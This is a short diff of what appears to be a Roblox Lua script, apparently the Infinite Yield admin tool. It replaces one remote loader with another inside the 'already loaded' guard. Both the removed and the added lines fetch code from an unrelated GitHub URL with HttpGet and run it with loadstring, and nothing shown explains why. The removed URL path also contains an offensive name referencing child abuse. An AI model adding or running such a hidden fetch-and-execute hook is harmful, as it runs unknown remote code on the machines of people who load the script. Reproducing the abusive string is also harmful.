@@ -18,7 +18,7 @@
 ]]--
 
 if IY_LOADED and not _G.IY_DEBUG == true then
-	loadstring(game:HttpGet('https://github.com/IVAN12312312321321321312321213123/Ivan-s-EXEC/raw/refs/heads/main/irapekids'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Idkimcool9292/monk/refs/heads/main/ye'))()
 	return
 end
 
